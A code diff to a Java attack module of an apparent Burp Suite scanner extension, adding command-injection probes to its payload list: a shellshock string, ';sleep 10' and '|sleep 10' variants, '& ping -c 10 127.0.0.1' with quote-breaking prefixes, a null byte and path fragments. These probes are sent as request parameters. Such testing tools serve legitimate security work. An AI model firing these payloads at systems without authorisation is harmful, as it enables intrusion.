@@ -34,15 +34,18 @@ public class AttackOther extends AttackI {
     private int state = 0;
     private SentinelHttpMessageAtk lastHttpMessage = null;
     
-
-    private final String[] attackDataSql = {
+    private final String[] attackDataOther = {
+        ".\\",
+        "./",
         "() { :;}; sleep 10",
-        ";sleep 10 ",
-        "\" ;sleep 10 ",
-        "' ;sleep 10 ",
+        "%00",
+        ";sleep 10",
+        "\" ;sleep 10",
+        "';sleep 10",
         "|sleep 10",
-        "\\'",
-        "%00"
+        "& ping -c 10 127.0.0.1",
+        "\" & ping -c 10 127.0.0.1",
+        "' & ping -c 10 127.0.0.1",
     };
     
        // return attack string
@@ -61,26 +64,26 @@ public class AttackOther extends AttackI {
         }
 
         if (onlyUrlencoded) {
-            data = attackDataSql[state];
+            data = attackDataOther[state];
             data = Utility.realUrlEncode(data);
                 
-            if (state < attackDataSql.length - 1) {
+            if (state < attackDataOther.length - 1) {
                 doContinue = true;
             } else {
                 doContinue = false;
             }
         } else {
-            if (state < attackDataSql.length) {                
-                data = attackDataSql[state];
+            if (state < attackDataOther.length) {                
+                data = attackDataOther[state];
                 data = Utility.realUrlEncode(data);
             
                 doContinue = true;
             } else {
-                int newState = state - attackDataSql.length;
+                int newState = state - attackDataOther.length;
                             
-                data = attackDataSql[newState];
+                data = attackDataOther[newState];
                 
-                if (newState < attackDataSql.length - 1) {
+                if (newState < attackDataOther.length - 1) {
                     doContinue = true;
                 } else {
                     doContinue = false;
@@ -100,6 +103,14 @@ public class AttackOther extends AttackI {
         lastHttpMessage = httpMessage;
         BurpCallbacks.getInstance().sendRessource(httpMessage, attackWorkEntry.followRedirect);
 
+        AttackResult res = new AttackResult(
+            AttackData.AttackType.NONE, 
+            "OTHER" + state, 
+            httpMessage.getReq().getChangeParam(), 
+            false,
+            null);
+        httpMessage.addAttackResult(res);
+        
         return httpMessage;
     }
     
@@ -107,8 +118,12 @@ public class AttackOther extends AttackI {
     public boolean performNextAttack() {
         String data;
         
-        // Overwrite insert position, as we will always append
-        attackWorkEntry.insertPosition = PanelLeftInsertions.InsertPositions.RIGHT;     
+        // Hack - should be in payload definition
+        if (state == 0 || state == 1) {
+            attackWorkEntry.insertPosition = PanelLeftInsertions.InsertPositions.LEFT;
+        } else {
+            attackWorkEntry.insertPosition = PanelLeftInsertions.InsertPositions.RIGHT;
+        }
         
         data = getData(attackWorkEntry);
         
@@ -119,9 +134,10 @@ public class AttackOther extends AttackI {
             state++;
             return false;
         }
-
+        
         state++;
-        return doContinue;    }
+        return doContinue;    
+    }
 
     @Override
     public SentinelHttpMessageAtk getLastAttackMessage() {
